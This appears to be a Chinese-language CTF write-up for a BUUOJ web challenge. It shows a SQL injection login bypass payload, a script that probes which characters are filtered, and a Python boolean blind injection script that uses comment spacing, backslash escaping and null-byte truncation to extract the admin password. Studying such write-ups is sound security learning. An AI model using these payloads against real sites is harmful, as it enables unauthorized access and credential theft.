![[Pasted image 20230120113124.png|500]]

![[Pasted image 20230120113103.png|500]]

![[Pasted image 20230120113230.png|500]]

```
username=admin
passwd=1' or 1=1 or '1
```

![[Pasted image 20230120150739.png|500]]

```python
import requests
import time

url = 'http://xxx.node4.buuoj.cn:81/index.php'
data = {'username' : '1', 'passwd': ''}

for i in range(128):
    data['passwd'] = chr(i)
    if requests.post(url, data=data).text.__contains__('hacker'):
        print('\'{}\''.format(chr(i)))
    time.sleep(0.1)
```

```
' '
'#'
'''
','
'-'
'.'
'<'
'='
'>'
```

由于单引号被过滤，尝试使用`\`对原有的单引号进行转义

由于空格也被过滤，为了维持语法的正确，使用`/**/`作为间隔

`passwd`右边的单引号通过`\0`截断

最终查询像这样

```sql
select * from users where username='\' and passwd='/**/or/**/passwd/**/regexp/**/"<reg>";
```

(好像`or`也被过滤了)

```python
import requests
import time

url = "http://18bd2d66-8fe7-4c4b-add6-b7d365efc8ed.node4.buuoj.cn:81/index.php"
fmt = '/**/||/**/passwd/**/not/**/regexp/**/"{}";\000'

data = {'username': '\\', 'passwd': fmt.format('^a')}
print(requests.post(url, data=data).text)
```

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /welcome.php was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at 18bd2d66-8fe7-4c4b-add6-b7d365efc8ed.node4.buuoj.cn Port 81</address>
</body></html>
```

如果查询有结果就返回404，没有返回200

```python
import requests
import time
import sys
import string

url = "http://xxx.node4.buuoj.cn:81/index.php"

pass_fmt = '/**/||/**/passwd/**/regexp/**/"^{}";\000'
data = {'username': '\\', 'passwd': ''}
false_func = lambda response : response.status_code == 200

word_list = string.ascii_uppercase + string.ascii_lowercase + string.digits + '_'

res = ''

while True:
    for i in word_list:
        data['passwd'] = pass_fmt.format(res + i)

        time.sleep(0.1)
        response = requests.post(url, data)
        if not false_func(response):
            print(i, end='')
            sys.stdout.flush()
            res += i
            break
```

```
YOU_WILL_NEVER_KNOW7788990
```

转为小写之后拿去登录就拿到了`flag`

![[Pasted image 20230120162247.png|500]]

#Web #SQL注入 #布尔盲注 #绕过